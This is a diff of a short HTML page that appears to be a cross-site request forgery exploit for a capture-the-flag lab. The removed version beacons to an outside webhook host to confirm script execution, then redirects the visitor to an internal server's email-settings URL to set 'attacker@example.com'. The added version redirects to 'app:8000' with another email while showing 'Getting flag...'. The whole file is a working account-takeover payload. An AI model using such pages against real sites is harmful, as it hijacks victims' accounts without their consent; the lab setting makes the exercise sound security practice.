@@ -1,13 +1,14 @@
-<!DOCTYPE html>
-<html>
-<body>
-<script>
-var test = new Image();
-test.src = "https://006d396333124240a5a24829f6449a40.webhooks.page/?stage=javascript-executed";
-
-setTimeout(function() {
-    window.location = "http://100.101.228.35:6009/settings/email?new=attacker@example.com";
-}, 2000);
-</script>
-</body>
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Account Settings</title>
+  </head>
+  <body>
+    <p>Getting flag...</p>
+    <script>
+      location.href =
+        "http://app:8000/settings/email?new=freshemail@example.com";
+    </script>
+  </body>
 </html>
